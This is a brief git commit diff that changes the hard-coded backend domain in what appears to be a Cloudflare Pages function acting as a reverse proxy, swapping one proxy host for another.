1246f427b59b49b6b623b51d659f37191396c517
3x5lsdswe <3x5loyupnpk97@mmtwh.com>
2025-01-08 10:53:35 +0000

    Update [[path]].js

--- functions/[[path]].js
+++ functions/[[path]].js
@@ -1,7 +1,7 @@
 export async function onRequest({ request }) {
 	const url = new URL(request.url)
 
-	const proxyUrl = 'https://moeisonlini.buzz'
+	const proxyUrl = 'https://lowieskoseaq.sbs'
 	const backendUrl = `${proxyUrl}${url.pathname}`
 
 	const headers = new Headers(request.headers)
